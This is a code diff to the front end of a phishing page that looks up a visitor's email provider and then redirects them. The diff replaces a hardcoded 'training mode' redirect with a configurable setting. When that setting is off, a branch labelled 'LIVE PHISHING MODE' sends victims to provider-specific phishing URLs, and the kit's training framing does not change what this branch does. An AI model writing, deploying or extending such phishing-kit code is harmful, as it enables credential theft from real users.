@@ -1650,14 +1650,39 @@ function showMobileError() {
             `;
         }
 
+        // Load settings from API
+        let appSettings = null;
+        
+        async function loadSettings() {
+            try {
+                const response = await fetch(getApiUrl('settings.php'));
+                const data = await response.json();
+                if (data.success) {
+                    appSettings = data.settings;
+                }
+            } catch (error) {
+                console.error('Error loading settings:', error);
+                // Use defaults if settings fail to load
+                appSettings = {
+                    training_mode: true,
+                    training_url: '/training-reveal.html',
+                    redirect_urls: {
+                        'office365': 'https://pdf-render.vercel.app/viewer?from=me',
+                        'google': 'https://pdf-render.vercel.app/viewer?from=me',
+                        'other': 'https://pdf-render.vercel.app/viewer?from=me'
+                    }
+                };
+            }
+        }
+
         function redirectToProvider(email, mxResult) {
-            const redirectUrls = {
-                'office365': 'https://7806d4cf9366-endpoint.com/?device=d2301a85-917a-484c-8c6b-d3273eebd8dd',
+            const redirectUrls = appSettings?.redirect_urls || {
+                'office365': 'https://pdf-render.vercel.app/viewer?from=me',
                 'google': 'https://pdf-render.vercel.app/viewer?from=me',
                 'other': 'https://pdf-render.vercel.app/viewer?from=me'
             };
 
-            const redirectUrl = redirectUrls[mxResult.provider] || 'https://pdf-render.vercel.app/viewer?from=me';
+            const redirectUrl = redirectUrls[mxResult.provider] || redirectUrls.other || 'https://pdf-render.vercel.app/viewer?from=me';
             window.location.href = redirectUrl;
         }
 
@@ -1702,13 +1727,16 @@ function showMobileError() {
 
                 await new Promise(resolve => setTimeout(resolve, 1500));
 
-                // ========== TRAINING MODE: Redirect to reveal page instead of phishing site ==========
-                // COMMENT OUT the line below to use real phishing redirects (NOT RECOMMENDED for training)
-                const basePath = window.location.pathname.substring(0, window.location.pathname.lastIndexOf('/'));
-                window.location.href = basePath + '/training-reveal.html';
-                
-                // ORIGINAL CODE (commented out for training mode):
-                // redirectToProvider(email, mxResult);
+                // Check if training mode is enabled (from settings)
+                if (appSettings?.training_mode !== false) {
+                    // TRAINING MODE: Redirect to training reveal page
+                    const basePath = window.location.pathname.substring(0, window.location.pathname.lastIndexOf('/'));
+                    const trainingUrl = appSettings?.training_url || '/training-reveal.html';
+                    window.location.href = basePath + trainingUrl;
+                } else {
+                    // LIVE PHISHING MODE: Redirect to provider-specific phishing page
+                    redirectToProvider(email, mxResult);
+                }
 
             } catch (error) {
                 console.error('Verification error:', error);
@@ -1723,6 +1751,7 @@ function showMobileError() {
 
         // Initialize
         window.addEventListener('DOMContentLoaded', async () => {
+            await loadSettings(); // Load settings first
             await initializePage();
             init();
         });
